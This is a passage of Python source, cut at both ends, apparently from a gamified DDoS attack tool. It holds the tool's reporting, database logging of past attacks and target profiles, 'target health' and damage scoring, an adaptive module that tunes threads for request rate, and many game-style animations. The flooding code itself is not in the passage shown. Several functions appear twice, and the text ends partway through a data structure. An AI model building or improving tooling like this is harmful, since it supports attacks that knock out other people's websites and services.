    max_count = max(buckets) if max(buckets) > 0 else 1
    
    lines = []
    for h in range(height, 0, -1):
        line = ""
        threshold = (h / height) * max_count
        for count in buckets:
            if count >= threshold:
                line += "█"
            elif count >= threshold * 0.7:
                line += "▓"
            elif count >= threshold * 0.4:
                line += "▒"
            else:
                line += "░"
            line += " "
        lines.append(line)
    
    # Add labels
    lines.append("0  1  2  3  4  5  6  7  8  9+ (100ms)")
    
    return "\n".join(lines)

def create_xp_bar(current_xp: int, level: int, width: int = 30) -> str:
    """Create XP progress bar"""
    xp_needed = level * XP_PER_LEVEL
    progress = min(current_xp / xp_needed, 1.0)
    filled = int(progress * width)
    bar = "█" * filled + "░" * (width - filled)
    return f"[{bar}] {current_xp}/{xp_needed}"

async def show_achievement_unlock(achievement_id: str):
    """Show achievement unlock animation"""
    achievement = ACHIEVEMENTS_LIST.get(achievement_id)
    if not achievement:
        return
    
    console.print()
    console.print("" + "═" * 70 + "")
    console.print()
    
    # Animated reveal
    for _ in range(3):
        console.print("\r>>> ACHIEVEMENT UNLOCKED <<<".center(70), end="")
        await asyncio.sleep(0.2)
        console.print("\r" + " " * 70, end="")
        await asyncio.sleep(0.1)
    
    console.print("\r>>> ACHIEVEMENT UNLOCKED <<<".center(70))
    console.print()
    console.print(f"{achievement['name']}".center(70))
    console.print(f"{achievement['desc']}".center(70))
    console.print(f"+{achievement['xp']} XP".center(70))
    console.print()
    console.print("" + "═" * 70 + "")
    await asyncio.sleep(1.5)

def save_config(config: dict, filename: str = "attack_config.json"):
    """Save attack configuration"""
    try:
        import json
        with open(filename, "w") as f:
            json.dump(config, f, indent=2)
        return True
    except:
        return False

def load_config(filename: str = "attack_config.json") -> dict:
    """Load attack configuration"""
    try:
        import json
        with open(filename, "r") as f:
            return json.load(f)
    except:
        return None

def analyze_target_strength(success_rate: float, avg_response_time: float) -> dict:
    """Analyze target defenses"""
    if success_rate >= 80:
        strength = "WEAK"
        defense = "Minimal"
    elif success_rate >= 50:
        strength = "MEDIUM"
        defense = "Standard"
    elif success_rate >= 20:
        strength = "STRONG"
        defense = "Hardened"
    else:
        strength = "FORTIFIED"
        defense = "Military-grade"
    
    return {
        "strength": strength,
        "defense": defense,
        "vulnerability": 100 - success_rate,
    }

def get_performance_grade(rps: float, success_rate: float) -> tuple:
    """Calculate performance grade S/A/B/C/D"""
    score = (rps / 10) + (success_rate * 2)
    
    if score >= 150:
        return "S", "bold white"
    elif score >= 100:
        return "A", "white"
    elif score >= 60:
        return "B", "white"
    elif score >= 30:
        return "C", "dim white"
    else:
        return "D", "dim white"

def get_target_strength(success_rate: float) -> str:
    """Analyze target strength based on success rate"""
    if success_rate >= 80:
        return "WEAK"
    elif success_rate >= 50:
        return "MEDIUM"
    elif success_rate >= 20:
        return "STRONG"
    else:
        return "FORTIFIED"

def create_pie_chart(success: int, fail: int, width: int = 20) -> str:
    """Create ASCII pie chart"""
    total = success + fail
    if total == 0:
        return "[" + "░" * width + "]"
    
    success_portion = int((success / total) * width)
    fail_portion = width - success_portion
    
    return "[" + "█" * success_portion + "░" * fail_portion + "]"

async def check_daily_challenge(stats: dict, elapsed: float, rps: float):
    """Check if daily challenge was completed"""
    success_rate = (stats["success"] / max(stats["total"], 1)) * 100
    
    if session_stats["daily_challenge_completed"]:
        return None
    
    # Check each challenge
    for challenge in DAILY_CHALLENGES:
        if challenge["id"] == "speed_run" and rps >= 500:
            session_stats["daily_challenge_completed"] = True
            session_stats["xp"] += challenge["xp"]
            return challenge
        elif challenge["id"] == "perfect_day" and success_rate >= 90:
            session_stats["daily_challenge_completed"] = True
            session_stats["xp"] += challenge["xp"]
            return challenge
        elif challenge["id"] == "marathon_day" and elapsed >= 180:
            session_stats["daily_challenge_completed"] = True
            session_stats["xp"] += challenge["xp"]
            return challenge
        elif challenge["id"] == "volume_day" and stats["total"] >= 10000:
            session_stats["daily_challenge_completed"] = True
            session_stats["xp"] += challenge["xp"]
            return challenge
    
    return None

async def show_explosion(size: str = "medium"):
    """Show ASCII art explosion animation"""
    explosions = {
        "small": [
            "    *    ",
            "   ***   ",
            "  *****  ",
            "   ***   ",
            "    *    ",
        ],
        "medium": [
            "      *      ",
            "    *****    ",
            "   *******   ",
            "  *********  ",
            " *********** ",
            "  *********  ",
            "   *******   ",
            "    *****    ",
            "      *      ",
        ],
        "large": [
            "        *        ",
            "      *****      ",
            "    *********    ",
            "   ***********   ",
            "  *************  ",
            " *************** ",
            "*****************",
            " *************** ",
            "  *************  ",
            "   ***********   ",
            "    *********    ",
            "      *****      ",
            "        *        ",
        ]
    }
    
    explosion = explosions.get(size, explosions["medium"])
    
    # Animate explosion
    for frame in range(3):
        console.print()
        for line in explosion:
            console.print(f"{line.center(70)}")
        await asyncio.sleep(0.15)
        if frame < 2:
            console.clear()

async def screen_shake_effect(text: str, duration: float = 0.5):
    """Create screen shake effect by jittering text"""
    start = time.time()
    while time.time() - start < duration:
        # Random offset
        offset = random.randint(0, 3)
        console.print("\r" + " " * offset + text, end="")
        await asyncio.sleep(0.05)
    console.print("\r" + text)

def export_report_csv(stats: dict, target_url: str, elapsed: float, filename: str):
    """Export attack report to CSV format"""
    try:
        import csv
        rps = stats["total"] / elapsed if elapsed > 0 else 0
        success_rate = (stats["success"] / max(stats["total"], 1)) * 100
        
        with open(filename, "w", newline="") as f:
            writer = csv.writer(f)
            writer.writerow(["Metric", "Value"])
            writer.writerow(["Target", target_url])
            writer.writerow(["Timestamp", datetime.now().strftime("%Y-%m-%d %H:%M:%S")])
            writer.writerow(["Total Requests", stats["total"]])
            writer.writerow(["Successful", stats["success"]])
            writer.writerow(["Failed", stats["fail"]])
            writer.writerow(["Success Rate %", f"{success_rate:.2f}"])
            writer.writerow(["RPS", f"{rps:.2f}"])
            writer.writerow(["Data Sent MB", f"{stats['bytes_sent']/(1024*1024):.2f}"])
            writer.writerow(["Duration Seconds", f"{elapsed:.2f}"])
        return True
    except:
        return False

def export_report_html(stats: dict, target_url: str, elapsed: float, filename: str):
    """Export attack report to HTML format"""
    try:
        rps = stats["total"] / elapsed if elapsed > 0 else 0
        success_rate = (stats["success"] / max(stats["total"], 1)) * 100
        
        html = f"""<!DOCTYPE html>
<html>
<head>
    <title>DDOS Tool - Attack Report</title>
    <style>
        body {{ font-family: monospace; background: #000; color: #fff; padding: 20px; }}
        h1 {{ color: #fff; border-bottom: 2px solid #fff; }}
        table {{ border-collapse: collapse; width: 100%; margin: 20px 0; }}
        th, td {{ border: 1px solid #fff; padding: 10px; text-align: left; }}
        th {{ background: #333; }}
        .success {{ color: #0f0; }}
        .fail {{ color: #f00; }}
    </style>
</head>
<body>
    <h1>DDOS TOOL - ATTACK REPORT</h1>
    <table>
        <tr><th>Metric</th><th>Value</th></tr>
        <tr><td>Target</td><td>{target_url}</td></tr>
        <tr><td>Timestamp</td><td>{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</td></tr>
        <tr><td>Total Requests</td><td>{stats["total"]:,}</td></tr>
        <tr><td class="success">Successful</td><td class="success">{stats["success"]:,}</td></tr>
        <tr><td class="fail">Failed</td><td class="fail">{stats["fail"]:,}</td></tr>
        <tr><td>Success Rate</td><td>{success_rate:.2f}%</td></tr>
        <tr><td>RPS</td><td>{rps:.2f}</td></tr>
        <tr><td>Data Sent</td><td>{stats["bytes_sent"]/(1024*1024):.2f} MB</td></tr>
        <tr><td>Duration</td><td>{elapsed:.2f}s</td></tr>
    </table>
</body>
</html>"""
        
        with open(filename, "w") as f:
            f.write(html)
        return True
    except:
        return False

def export_report_html(stats: dict, target_url: str, elapsed: float, filename: str):
    """Export attack report to HTML format"""
    try:
        rps = stats["total"] / elapsed if elapsed > 0 else 0
        success_rate = (stats["success"] / max(stats["total"], 1)) * 100
        
        html = f"""<!DOCTYPE html>
<html>
<head>
    <title>DDOS Tool - Attack Report</title>
    <style>
        body {{ font-family: monospace; background: #000; color: #fff; padding: 20px; }}
        h1 {{ color: #fff; border-bottom: 2px solid #fff; }}
        table {{ border-collapse: collapse; width: 100%; margin: 20px 0; }}
        th, td {{ border: 1px solid #fff; padding: 10px; text-align: left; }}
        th {{ background: #333; }}
        .success {{ color: #0f0; }}
        .fail {{ color: #f00; }}
    </style>
</head>
<body>
    <h1>DDOS TOOL - ATTACK REPORT</h1>
    <table>
        <tr><th>Metric</th><th>Value</th></tr>
        <tr><td>Target</td><td>{target_url}</td></tr>
        <tr><td>Timestamp</td><td>{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</td></tr>
        <tr><td>Total Requests</td><td>{stats["total"]:,}</td></tr>
        <tr><td class="success">Successful</td><td class="success">{stats["success"]:,}</td></tr>
        <tr><td class="fail">Failed</td><td class="fail">{stats["fail"]:,}</td></tr>
        <tr><td>Success Rate</td><td>{success_rate:.2f}%</td></tr>
        <tr><td>RPS</td><td>{rps:.2f}</td></tr>
        <tr><td>Data Sent</td><td>{stats["bytes_sent"]/(1024*1024):.2f} MB</td></tr>
        <tr><td>Duration</td><td>{elapsed:.2f}s</td></tr>
    </table>
</body>
</html>"""
        
        with open(filename, "w") as f:
            f.write(html)
        return True
    except:
        return False

def save_attack_to_database(stats: dict, target_url: str, elapsed: float, mode: str, threads: int, grade: str, xp_gained: int):
    """Save attack to database"""
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        rps = stats["total"] / elapsed if elapsed > 0 else 0
        success_rate = (stats["success"] / max(stats["total"], 1)) * 100
        
        cursor.execute('''
            INSERT INTO attacks (target, timestamp, total_requests, successful, failed, 
                               success_rate, rps, data_sent, duration, mode, threads, grade, xp_gained)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            target_url,
            datetime.now().isoformat(),
            stats["total"],
            stats["success"],
            stats["fail"],
            success_rate,
            rps,
            stats["bytes_sent"] / (1024 * 1024),
            elapsed,
            mode,
            threads,
            grade,
            xp_gained
        ))
        
        # Update target profile
        cursor.execute('SELECT * FROM target_profiles WHERE target = ?', (target_url,))
        profile = cursor.fetchone()
        
        if profile:
            # Update existing profile
            cursor.execute('''
                UPDATE target_profiles 
                SET last_attacked = ?, 
                    total_attacks = total_attacks + 1,
                    avg_success_rate = (avg_success_rate * total_attacks + ?) / (total_attacks + 1),
                    best_rps = MAX(best_rps, ?)
                WHERE target = ?
            ''', (datetime.now().isoformat(), success_rate, rps, target_url))
        else:
            # Create new profile
            vulnerability = int(success_rate)
            cursor.execute('''
                INSERT INTO target_profiles (target, first_seen, last_attacked, total_attacks, 
                                            avg_success_rate, best_rps, vulnerability_score, notes)
                VALUES (?, ?, ?, 1, ?, ?, ?, ?)
            ''', (target_url, datetime.now().isoformat(), datetime.now().isoformat(), 
                  success_rate, rps, vulnerability, ""))
        
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        print(f"Database error: {e}")
        return False

def get_attack_history(limit: int = 10) -> List[dict]:
    """Get attack history from database"""
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT * FROM attacks 
            ORDER BY timestamp DESC 
            LIMIT ?
        ''', (limit,))
        
        rows = cursor.fetchall()
        conn.close()
        
        history = []
        for row in rows:
            history.append({
                "id": row[0],
                "target": row[1],
                "timestamp": row[2],
                "total_requests": row[3],
                "successful": row[4],
                "failed": row[5],
                "success_rate": row[6],
                "rps": row[7],
                "data_sent": row[8],
                "duration": row[9],
                "mode": row[10],
                "threads": row[11],
                "grade": row[12],
                "xp_gained": row[13],
            })
        
        return history
    except:
        return []

def get_target_profile(target_url: str) -> Optional[dict]:
    """Get target profile from database"""
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        cursor.execute('SELECT * FROM target_profiles WHERE target = ?', (target_url,))
        row = cursor.fetchone()
        conn.close()
        
        if row:
            return {
                "target": row[0],
                "first_seen": row[1],
                "last_attacked": row[2],
                "total_attacks": row[3],
                "avg_success_rate": row[4],
                "best_rps": row[5],
                "vulnerability_score": row[6],
                "notes": row[7],
            }
        return None
    except:
        return None

def adaptive_ai_learn(stats: dict, elapsed: float, threads: int):
    """Adaptive AI learns from attack results"""
    if not ADAPTIVE_AI["enabled"]:
        return
    
    rps = stats["total"] / elapsed if elapsed > 0 else 0
    success_rate = (stats["success"] / max(stats["total"], 1)) * 100
    
    # Calculate efficiency score
    efficiency = (rps / threads) * (success_rate / 100)
    
    # Store in history
    ADAPTIVE_AI["history"].append({
        "threads": threads,
        "rps": rps,
        "success_rate": success_rate,
        "efficiency": efficiency,
    })
    
    # Learn optimal settings
    if len(ADAPTIVE_AI["history"]) >= 5:
        # Find best performing configuration
        best = max(ADAPTIVE_AI["history"], key=lambda x: x["efficiency"])
        
        # Adjust optimal threads with learning rate
        lr = ADAPTIVE_AI["learning_rate"]
        ADAPTIVE_AI["optimal_threads"] = int(
            ADAPTIVE_AI["optimal_threads"] * (1 - lr) + best["threads"] * lr
        )

def predict_success_rate(target_url: str, threads: int) -> float:
    """Predict success rate using historical data"""
    profile = get_target_profile(target_url)
    if not profile:
        return 50.0  # Default prediction
    
    # Base prediction on historical average
    base_rate = profile["avg_success_rate"]
    
    # Adjust based on vulnerability score
    vulnerability_factor = profile["vulnerability_score"] / 100
    
    # Adjust based on threads (more threads = potentially lower success rate due to rate limiting)
    thread_factor = max(0.5, 1.0 - (threads / 10000) * 0.3)
    
    predicted = base_rate * vulnerability_factor * thread_factor
    return min(100.0, max(0.0, predicted))

def calculate_target_health(stats: dict, elapsed: float) -> int:
    """Calculate target health (0-100, lower is worse for target)"""
    if stats["total"] == 0:
        return 100
    
    success_rate = (stats["success"] / stats["total"]) * 100
    rps = stats["total"] / elapsed if elapsed > 0 else 0
    
    # Health decreases with high success rate and high RPS
    health = 100 - (success_rate * 0.5) - min(rps / 20, 50)
    
    return max(0, min(100, int(health)))

def apply_skill_bonuses() -> dict:
    """Calculate bonuses from skill tree"""
    bonuses = {
        "rps_multiplier": 1.0,
        "success_bonus": 0,
        "thread_bonus": 0,
        "stealth_bonus": 0,
    }
    
    # Speed skill
    bonuses["rps_multiplier"] += session_stats["skills"]["speed"] * 0.1
    
    # Efficiency skill
    bonuses["success_bonus"] += session_stats["skills"]["efficiency"] * 5
    
    # Power skill
    bonuses["thread_bonus"] += session_stats["skills"]["power"] * 1000
    
    # Stealth skill
    bonuses["stealth_bonus"] += session_stats["skills"]["stealth"] * 20
    
    return bonuses

def apply_equipment_bonuses() -> dict:
    """Calculate bonuses from equipment"""
    bonuses = {
        "rps_bonus": 0,
        "efficiency_bonus": 0,
        "xp_bonus": 0,
    }
    
    # Weapon bonus
    weapon = session_stats["equipment"]["weapon"]
    bonuses["rps_bonus"] += EQUIPMENT["weapon"][weapon]["rps_bonus"]
    
    # Armor bonus
    armor = session_stats["equipment"]["armor"]
    bonuses["efficiency_bonus"] += EQUIPMENT["armor"][armor]["efficiency_bonus"]
    
    # Accessory bonus
    accessory = session_stats["equipment"]["accessory"]
    bonuses["xp_bonus"] += EQUIPMENT["accessory"][accessory]["xp_bonus"]
    
    return bonuses

def apply_prestige_bonuses() -> dict:
    """Calculate bonuses from prestige level"""
    if session_stats["prestige"] == 0:
        return {"xp_multiplier": 1.0, "rps_multiplier": 1.0}
    
    prestige_data = PRESTIGE_LEVELS.get(session_stats["prestige"], PRESTIGE_LEVELS[1])
    return {
        "xp_multiplier": prestige_data["bonus_xp"],
        "rps_multiplier": prestige_data["bonus_rps"],
    }

def apply_prestige_bonuses() -> dict:
    """Calculate bonuses from prestige level"""
    if session_stats["prestige"] == 0:
        return {"xp_multiplier": 1.0, "rps_multiplier": 1.0}
    
    prestige_data = PRESTIGE_LEVELS.get(session_stats["prestige"], PRESTIGE_LEVELS[1])
    return {
        "xp_multiplier": prestige_data["bonus_xp"],
        "rps_multiplier": prestige_data["bonus_rps"],
    }

def calculate_total_power() -> dict:
    """Calculate total power with ALL bonuses"""
    power = {
        "base_threads": 2000,
        "base_rps": 100,
        "total_multiplier": 1.0,
        "crit_chance": CRITICAL_HIT_CHANCE,
        "crit_multiplier": CRITICAL_HIT_MULTIPLIER,
    }
    
    # Skill bonuses
    skill_bonuses = apply_skill_bonuses()
    power["base_threads"] += skill_bonuses["thread_bonus"]
    power["total_multiplier"] *= skill_bonuses["rps_multiplier"]
    
    # Equipment bonuses
    equipment_bonuses = apply_equipment_bonuses()
    power["base_rps"] += equipment_bonuses["rps_bonus"]
    
    # Prestige bonuses
    prestige_bonuses = apply_prestige_bonuses()
    power["total_multiplier"] *= prestige_bonuses["rps_multiplier"]
    
    # Ascension bonuses
    if ASCENSION_LEVEL > 0:
        ascension_data = ASCENSION_BONUSES.get(ASCENSION_LEVEL, {"all_stats": 1.0})
        power["total_multiplier"] *= ascension_data["all_stats"]
    
    # Berserker stacks
    power["total_multiplier"] *= (1.0 + BERSERKER_STACKS * BERSERKER_STACK_BONUS)
    
    # Active buffs
    for buff in ACTIVE_BUFFS:
        if buff["type"] == "haste":
            power["total_multiplier"] *= 1.5
        elif buff["type"] == "strength":
            power["total_multiplier"] *= 1.3
        elif buff["type"] == "godmode":
            power["total_multiplier"] *= 6.0
    
    # Combo multiplier
    combo_count = session_stats.get("current_combo", 0)
    for threshold, multiplier in sorted(COMBO_MULTIPLIERS.items(), reverse=True):
        if combo_count >= threshold:
            power["total_multiplier"] *= multiplier
            break
    
    # Weapon mastery
    current_weapon = session_stats["equipment"]["weapon"]
    weapon_type = current_weapon.split("_")[0] if "_" in current_weapon else current_weapon
    mastery_level = WEAPON_MASTERY.get(weapon_type, 0)
    
    for threshold, mastery_data in sorted(MASTERY_LEVELS.items(), reverse=True):
        if mastery_level >= threshold:
            power["total_multiplier"] *= (1.0 + mastery_data["bonus"])
            break
    
    # Pet bonuses
    if "active_pet" in session_stats and session_stats["active_pet"]:
        pet_data = PETS.get(session_stats["active_pet"])
        if pet_data:
            power["base_rps"] += pet_data["rps_bonus"]
    
    # Guild bonuses
    if GUILD_DATA["name"]:
        power["total_multiplier"] *= (1.0 + GUILD_DATA["guild_bonuses"]["rps"] / 100)
    
    # World events
    if WORLD_EVENTS["double_xp"]["active"]:
        power["total_multiplier"] *= 1.5
    
    # Infinity mode scaling
    if INFINITY_MODE["enabled"]:
        power["total_multiplier"] *= INFINITY_MODE["difficulty_multiplier"]
    
    return power

def calculate_damage_per_request(power_data: dict, is_crit: bool = False) -> float:
    """Calculate damage dealt per request"""
    base_damage = 1.0
    
    # Apply power multiplier
    damage = base_damage * power_data["total_multiplier"]
    
    # Critical hit
    if is_crit:
        damage *= power_data["crit_multiplier"]
    
    # Rage mode (low success rate)
    if hasattr(session_stats, "current_success_rate"):
        if session_stats.get("current_success_rate", 100) < RAGE_MODE_THRESHOLD:
            damage *= RAGE_MODE_MULTIPLIER
    
    # Overkill mode (high success rate)
    if hasattr(session_stats, "current_success_rate"):
        if session_stats.get("current_success_rate", 0) > OVERKILL_MODE_THRESHOLD:
            damage *= OVERKILL_MODE_MULTIPLIER
    
    return damage

def roll_critical_hit(power_data: dict) -> bool:
    """Roll for critical hit"""
    return random.random() < power_data["crit_chance"]

def apply_buff(buff_type: str):
    """Apply buff to player"""
    if buff_type in BUFF_TYPES:
        buff_data = BUFF_TYPES[buff_type].copy()
        buff_data["type"] = buff_type
        buff_data["start_time"] = time.time()
        ACTIVE_BUFFS.append(buff_data)
        DETAILED_STATS["total_buffs_used"] += 1

def update_buffs():
    """Update and remove expired buffs"""
    current_time = time.time()
    global ACTIVE_BUFFS
    ACTIVE_BUFFS = [
        buff for buff in ACTIVE_BUFFS
        if current_time - buff["start_time"] < buff["duration"]
    ]

def use_ultimate(ability_name: str) -> bool:
    """Use ultimate ability if off cooldown"""
    if ability_name not in ULTIMATE_ABILITIES:
        return False
    
    ability = ULTIMATE_ABILITIES[ability_name]
    current_time = time.time()
    
    if current_time - ability["last_used"] >= ability["cooldown"]:
        ability["last_used"] = current_time
        DETAILED_STATS["total_ultimates_used"] += 1
        return True
    
    return False

def check_synergies() -> List[str]:
    """Check for equipment synergies"""
    active_synergies = []
    
    equipped = [
        session_stats["equipment"]["weapon"],
        session_stats["equipment"]["armor"],
        session_stats["equipment"]["accessory"],
    ]
    
    for synergy_name, synergy_data in SYNERGIES.items():
        if all(item in equipped for item in synergy_data["items"]):
            active_synergies.append(synergy_name)
    
    return active_synergies

def gain_weapon_mastery(weapon_type: str, amount: int = 1):
    """Gain weapon mastery experience"""
    if weapon_type in WEAPON_MASTERY:
        WEAPON_MASTERY[weapon_type] += amount

def roll_mutation() -> Optional[dict]:
    """Roll for random mutation"""
    if random.random() < 0.01:  # 1% chance
        rarity_weights = {
            "uncommon": 0.5,
            "rare": 0.3,
            "epic": 0.15,
            "legendary": 0.05,
        }
        
        # Filter by rarity
        available = [m for m in MUTATION_POOL if random.random() < rarity_weights.get(m["rarity"], 0)]
        if available:
            return random.choice(available)
    
    return None

async def show_power_display():
    """Display current power level"""
    power = calculate_total_power()
    
    console.print()
    console.print("POWER ANALYSIS".center(70))
    console.print("" + "─" * 70 + "")
    console.print()
    
    console.print(f"Base Threads: {power['base_threads']:,}")
    console.print(f"Base RPS: {power['base_rps']:,}")
    console.print(f"Total Multiplier: {power['total_multiplier']:.2f}x")
    console.print(f"Effective RPS: {int(power['base_rps'] * power['total_multiplier']):,}")
    console.print(f"Crit Chance: {power['crit_chance']*100:.1f}%")
    console.print(f"Crit Multiplier: {power['crit_multiplier']:.1f}x")
    console.print()
    
    # Show active bonuses
    console.print("Active Bonuses:")
    
    if session_stats["prestige"] > 0:
        console.print(f"  ✓ Prestige {session_stats['prestige']}")
    
    if ASCENSION_LEVEL > 0:
        console.print(f"  ✓ Ascension {ASCENSION_LEVEL}")
    
    if BERSERKER_STACKS > 0:
        console.print(f"  ✓ Berserker x{BERSERKER_STACKS}")
    
    for buff in ACTIVE_BUFFS:
        remaining = buff["duration"] - (time.time() - buff["start_time"])
        console.print(f"  ✓ {buff['name']} ({remaining:.0f}s)")
    
    synergies = check_synergies()
    for synergy in synergies:
        console.print(f"  ✓ Synergy: {synergy}")
    
    console.print()

async def show_3d_graph():
    """Show rotating 3D ASCII graph"""
    frames = [
        """
        ╱╲
       ╱  ╲
      ╱    ╲
     ╱______╲
        """,
        """
        ╱╲
       ╱  ╲
      ╱____╲
     ╱      ╲
        """,
        """
        ╱╲
       ╱  ╲
      ╱    ╲
     ╱______╲
        """,
    ]
    
    for frame in frames:
        console.print(f"{frame}")
        await asyncio.sleep(0.2)
        console.clear()

async def show_matrix_rain(duration: float = 2.0):
    """Show Matrix-style falling characters"""
    start = time.time()
    chars = "01アイウエオカキクケコサシスセソタチツテト"
    
    while time.time() - start < duration:
        line = ""
        for _ in range(70):
            if random.random() < 0.3:
                line += random.choice(chars)
            else:
                line += " "
        console.print(f"{line}")
        await asyncio.sleep(0.05)

async def show_matrix_rain(duration: float = 2.0):
    """Show Matrix-style falling characters"""
    start = time.time()
    chars = "01アイウエオカキクケコサシスセソタチツテト"
    
    while time.time() - start < duration:
        line = ""
        for _ in range(70):
            if random.random() < 0.3:
                line += random.choice(chars)
            else:
                line += " "
        console.print(line)
        await asyncio.sleep(0.05)

def create_fancy_box(title: str, content: str, width: int = 70) -> str:
    """Create fancy box with title"""
    lines = []
    
    # Top border with title
    title_len = len(title)
    padding = (width - title_len - 4) // 2
    top = f"╔{'═' * padding}[ {title} ]{'═' * (width - padding - title_len - 4)}╗"
    lines.append(top)
    
    # Content
    for line in content.split('\n'):
        lines.append(f"║ {line.ljust(width - 4)} ║")
    
    # Bottom border
    lines.append(f"╚{'═' * (width - 2)}╝")
    
    return '\n'.join(lines)

def create_progress_bar_fancy(value: float, max_value: float, width: int = 50) -> str:
    """Create fancy progress bar with gradient"""
    if max_value == 0:
        return f"[{' ' * width}] 0%"
    
    percentage = min(100, (value / max_value) * 100)
    filled = int((percentage / 100) * width)
    
    # Create gradient effect
    bar = ""
    for i in range(width):
        if i < filled:
            # Full blocks
            bar += "█"
        elif i == filled:
            # Partial block based on remainder
            remainder = ((percentage / 100) * width) - filled
            if remainder > 0.75:
                bar += "▓"
            elif remainder > 0.5:
                bar += "▒"
            elif remainder > 0.25:
                bar += "░"
            else:
                bar += " "
        else:
            bar += " "
    
    return f"[{bar}] {percentage:.1f}%"

def create_meter(value: float, max_value: float = 100, width: int = 30) -> str:
    """Create meter display"""
    percentage = (value / max_value) * 100
    filled = int((percentage / 100) * width)
    
    meter = "▓" * filled + "░" * (width - filled)
    return f"|{meter}| {percentage:.0f}%"

def create_wave_display(data: list, width: int = 50) -> str:
    """Create wave pattern from data"""
    if not data or len(data) < 2:
        return "░" * width
    
    # Normalize data
    min_val = min(data)
    max_val = max(data)
    if max_val == min_val:
        return "▄" * width
    
    wave = ""
    for val in data[-width:]:
        normalized = (val - min_val) / (max_val - min_val)
        char_idx = int(normalized * (len(WAVE_PATTERNS) - 1))
        wave += WAVE_PATTERNS[char_idx]
    
    return wave.ljust(width, "░")

def create_ascii_graph(data: list, width: int = 60, height: int = 10) -> str:
    """Create ASCII line graph"""
    if not data or len(data) < 2:
        return "No data"
    
    # Get last 'width' points
    plot_data = data[-width:]
    max_val = max(plot_data) if max(plot_data) > 0 else 1
    
    lines = []
    for h in range(height, 0, -1):
        line = ""
        threshold = (h / height) * max_val
        
        for i, val in enumerate(plot_data):
            if val >= threshold:
                # Check if we should draw a line
                if i > 0 and plot_data[i-1] < threshold:
                    line += "╱"
                elif i < len(plot_data) - 1 and plot_data[i+1] < threshold:
                    line += "╲"
                else:
                    line += "█"
            else:
                line += " "
        
        lines.append(line)
    
    # Add axis
    lines.append("─" * width)
    
    return "\n".join(lines)

def create_dashboard_panel(title: str, content: str, style: str = "double") -> str:
    """Create dashboard panel"""
    width = 70
    border = ASCII_STYLES.get(style, "═")
    
    lines = []
    lines.append(f"╔{border * (width - 2)}╗")
    lines.append(f"║ {title.center(width - 4)} ║")
    lines.append(f"╠{border * (width - 2)}╣")
    
    for line in content.split('\n'):
        lines.append(f"║ {line.ljust(width - 4)} ║")
    
    lines.append(f"╚{border * (width - 2)}╝")
    
    return '\n'.join(lines)

def create_stat_display(label: str, value: str, width: int = 35) -> str:
    """Create stat display with dots"""
    dots = "." * (width - len(label) - len(value) - 2)
    return f"{label} {dots} {value}"

def create_table_row(cols: list, widths: list) -> str:
    """Create table row"""
    row = "║"
    for col, width in zip(cols, widths):
        row += f" {str(col).ljust(width)} │"
    row = row[:-1] + "║"
    return row

def create_separator(width: int = 70, style: str = "single") -> str:
    """Create separator line"""
    char = ASCII_STYLES.get(style, "─")
    return char * width

async def animated_text(text: str, delay: float = 0.02):
    """Animated text reveal"""
    for char in text:
        console.print(char, end="")
        await asyncio.sleep(delay)
    console.print()

async def pulse_effect(text: str, duration: float = 1.0):
    """Pulsing text effect"""
    frames = [
        f"  {text}  ",
        f" ▒{text}▒ ",
        f"▓▓{text}▓▓",
        f"██{text}██",
        f"▓▓{text}▓▓",
        f" ▒{text}▒ ",
    ]
    
    start = time.time()
    while time.time() - start < duration:
        for frame in frames:
            console.print(f"\r{frame.center(70)}", end="")
            await asyncio.sleep(0.1)
    console.print()

async def loading_bar(text: str, duration: float = 2.0):
    """Animated loading bar"""
    width = 50
    steps = int(duration / 0.05)
    
    for i in range(steps + 1):
        progress = i / steps
        filled = int(progress * width)
        bar = "█" * filled + "░" * (width - filled)
        percentage = int(progress * 100)
        
        console.print(f"\r{text} [{bar}] {percentage}%", end="")
        await asyncio.sleep(0.05)
    
    console.print()

async def show_countdown(seconds: int):
    """Show countdown with style"""
    for i in range(seconds, 0, -1):
        display = f"""
        ╔═══════════════════════════════════════╗
        ║                                       ║
        ║            LAUNCHING IN               ║
        ║                                       ║
        ║              ▓▓▓ {i} ▓▓▓              ║
        ║                                       ║
        ╚═══════════════════════════════════════╝
        """
        console.print(display)
        await asyncio.sleep(1)
        if i > 1:
            # Clear screen
            for _ in range(10):
                console.print()

async def show_explosion_fancy(size: str = "medium"):
    """Fancy explosion animation"""
    explosions = {
        "small": [
            ["    ░    ", "   ░░░   ", "  ░░░░░  ", "   ░░░   ", "    ░    "],
            ["    ▒    ", "   ▒▒▒   ", "  ▒▒▒▒▒  ", "   ▒▒▒   ", "    ▒    "],
            ["    ▓    ", "   ▓▓▓   ", "  ▓▓▓▓▓  ", "   ▓▓▓   ", "    ▓    "],
            ["    █    ", "   ███   ", "  █████  ", "   ███   ", "    █    "],
        ],
        "medium": [
            ["      ░      ", "    ░░░░░    ", "   ░░░░░░░   ", "  ░░░░░░░░░  ", "   ░░░░░░░   ", "    ░░░░░    "],
            ["      ▒      ", "    ▒▒▒▒▒    ", "   ▒▒▒▒▒▒▒   ", "  ▒▒▒▒▒▒▒▒▒  ", "   ▒▒▒▒▒▒▒   ", "    ▒▒▒▒▒    "],
            ["      ▓      ", "    ▓▓▓▓▓    ", "   ▓▓▓▓▓▓▓   ", "  ▓▓▓▓▓▓▓▓▓  ", "   ▓▓▓▓▓▓▓   ", "    ▓▓▓▓▓    "],
            ["      █      ", "    █████    ", "   ███████   ", "  █████████  ", "   ███████   ", "    █████    "],
        ],
        "large": [
            ["        ░        ", "      ░░░░░      ", "    ░░░░░░░░░    ", "   ░░░░░░░░░░░   ", "  ░░░░░░░░░░░░░  ", "   ░░░░░░░░░░░   ", "    ░░░░░░░░░    "],
            ["        ▒        ", "      ▒▒▒▒▒      ", "    ▒▒▒▒▒▒▒▒▒    ", "   ▒▒▒▒▒▒▒▒▒▒▒   ", "  ▒▒▒▒▒▒▒▒▒▒▒▒▒  ", "   ▒▒▒▒▒▒▒▒▒▒▒   ", "    ▒▒▒▒▒▒▒▒▒    "],
